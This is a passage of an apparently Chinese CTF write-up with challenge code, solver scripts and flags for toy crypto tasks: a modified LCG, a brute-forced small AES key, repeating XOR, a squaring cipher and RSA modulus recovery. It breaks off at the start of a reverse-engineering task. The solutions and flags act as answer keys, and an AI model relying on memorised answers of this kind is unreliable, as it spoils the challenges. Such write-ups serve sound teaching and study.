class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my_LCG</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed1 , seed2</span>):</span></span><br><span class="line">        self.state = [seed1,seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.a = bytes_to_long(flag[:<span class="number">8</span>])</span><br><span class="line">            self.b = bytes_to_long(flag[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">            self.c = bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">            <span class="keyword">if</span> self.a &lt; self.n <span class="keyword">and</span> self.b &lt; self.n <span class="keyword">and</span> self.c &lt; self.n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append( new )</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    lcg = my_LCG(getRandomInteger(<span class="number">64</span>),getRandomInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data = &quot;</span> + <span class="built_in">str</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(lcg.n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main() </span><br><span class="line"></span><br><span class="line"><span class="comment"># data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]</span></span><br><span class="line"><span class="comment"># n = 10104483468358610819</span></span><br></pre></td></tr></table></figure></blockquote><p>魔改三参数LCG，利用满足的公式 $as_{i-1}+bs_{i-2}+c \equiv s_i \pmod n$，得到三元一次同余方程组，利用Gröbner基求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">2626199569775466793</span>, <span class="number">8922951687182166500</span>, <span class="number">454458498974504742</span>, <span class="number">7289424376539417914</span>, <span class="number">8673638837300855396</span>]</span><br><span class="line">n = <span class="number">10104483468358610819</span></span><br><span class="line">PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (a*d[<span class="number">1</span>]+b*d[<span class="number">0</span>]+c-d[<span class="number">2</span>])</span><br><span class="line">f2 = (a*d[<span class="number">2</span>]+b*d[<span class="number">1</span>]+c-d[<span class="number">3</span>])</span><br><span class="line">f3 = (a*d[<span class="number">3</span>]+b*d[<span class="number">2</span>]+c-d[<span class="number">4</span>])</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    m += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;L1near_Equ4t1on6_1s_34sy&#x27;</span></span><br></pre></td></tr></table></figure><p>拼接：<code>cazy&#123;L1near_Equ4t1on6_1s_34sy&#125;</code></p><p>​    </p><h3 id="no-can-no-bb"><a href="#no-can-no-bb" class="headerlink" title="no_can_no_bb"></a>no_can_no_bb</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] ==<span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m</span>):</span></span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(m)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m,key</span>):</span></span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = pad(flag)</span><br><span class="line">    key = pad(long_to_bytes(random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)))</span><br><span class="line">    c = encrypt(flag,key)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>random范围不大，爆破key解AES-ECB：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">x</span>):</span></span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> x + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,key</span>):</span></span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">20</span>):</span><br><span class="line">        key = pad(long_to_bytes(i))</span><br><span class="line">        c = <span class="string">b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br><span class="line">        m = decrypt(c,key)</span><br><span class="line">        <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;cazy&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            </span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt;= <span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">can_encrypt</span>(<span class="params">flag,key</span>):</span></span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag,key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>key为5位，已知flag头5位，与密文异或得<code>key = b&#39;\x5f\x11\x32\xff\x61&#39;</code>，再异或密文还原明文：</p><p><code>cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</code></p><p>​    </p><h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">80</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sec_encry</span>(<span class="params">m</span>):</span></span><br><span class="line">    cip = (m - (<span class="number">1</span>&lt;&lt;<span class="number">500</span>))**<span class="number">2</span> + <span class="number">0x0338470</span></span><br><span class="line">    <span class="keyword">return</span> cip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = sec_encry(m)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>简单逆回去就好，注意一下开方取负值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line">c -= <span class="number">0x0338470</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">m = -gmpy2.iroot(c,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m+(<span class="number">1</span>&lt;&lt;<span class="number">500</span>))[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>数学最重要的就是推导</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pinvq:<span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">qinvp:<span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">c:<span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">e:<span class="number">0x10005</span></span><br><span class="line">d:<span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br></pre></td></tr></table></figure></blockquote><p>给出 $x=\text{inv}(p,q),y=\text{inv}(q,p),e,d,c$。</p><p>详细推导思路可参考 <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span></span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span></span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">0x10005</span></span><br><span class="line">    <span class="comment">#fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = <span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br><span class="line">    pprime = <span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">    qprime = <span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h3><blockquote><p>re签到题，格式：flag{output}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">0: const 60 ; &lt;module 